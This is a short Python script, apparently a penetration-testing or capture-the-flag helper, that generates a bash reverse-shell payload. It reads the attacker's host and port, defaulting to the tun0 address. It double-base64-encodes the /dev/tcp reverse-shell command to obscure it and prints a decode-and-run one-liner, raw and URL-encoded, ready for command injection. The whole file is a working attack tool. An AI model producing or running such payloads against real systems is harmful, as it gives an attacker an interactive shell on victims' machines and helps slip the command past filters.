#!/usr/bin/env python3

import sys
import base64
import subprocess
from urllib.parse import quote

if len(sys.argv) == 3:
    lhost = sys.argv[1]
    lport = sys.argv[2]

elif len(sys.argv) == 1:

    lhost = subprocess.check_output("ip -4 a show dev tun0|grep inet|cut -d ' ' -f 6|cut -d '/' -f 1", shell=True).decode().strip()
    tmp_lhost = input(f"LHOST [{lhost}]: ")
    lhost = tmp_lhost if tmp_lhost else lhost

    lport = 9001
    tmp_lport = input(f"LPORT [{lport}]: ")
    lport = tmp_lport if tmp_lport else lport

else:
    print(f"Usage: {sys.argv[0]} LHOST LPORT")
    print(f"Or: {sys.argv[0]}")
    exit(1)


s = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
s = base64.b64encode(base64.b64encode(s.encode())).decode()
s = f"echo {s}|base64 -d|base64 -d|bash"
print(s)
print(quote(s))